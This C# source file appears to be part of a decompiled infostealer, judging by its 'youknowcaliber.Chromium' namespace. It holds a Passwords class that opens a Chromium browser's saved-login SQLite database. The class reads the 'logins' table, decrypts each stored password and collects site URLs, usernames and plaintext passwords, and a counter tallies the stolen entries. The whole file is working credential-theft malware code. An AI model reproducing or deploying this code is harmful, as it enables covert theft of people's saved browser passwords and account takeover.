﻿using System;
using System.Collections.Generic;

namespace youknowcaliber.Chromium
{
	internal sealed class Passwords
	{
		public static List<Password> Get(string sLoginData)
		{
			List<Password> result;
			try
			{
				List<Password> list = new List<Password>();
				SQLite sqlite = SqlReader.ReadTable(sLoginData, "logins");
				bool flag = sqlite == null;
				if (flag)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						Password item = default(Password);
						item.sUrl = Crypto.GetUTF8(sqlite.GetValue(i, 0));
						item.sUsername = Crypto.GetUTF8(sqlite.GetValue(i, 3));
						string value = sqlite.GetValue(i, 5);
						bool flag2 = value != null;
						if (flag2)
						{
							item.sPassword = Crypto.GetUTF8(Crypto.EasyDecrypt(sLoginData, value));
							list.Add(item);
							Counting.Passwords++;
						}
					}
					result = list;
				}
			}
			catch
			{
				result = new List<Password>();
			}
			return result;
		}
	}
}
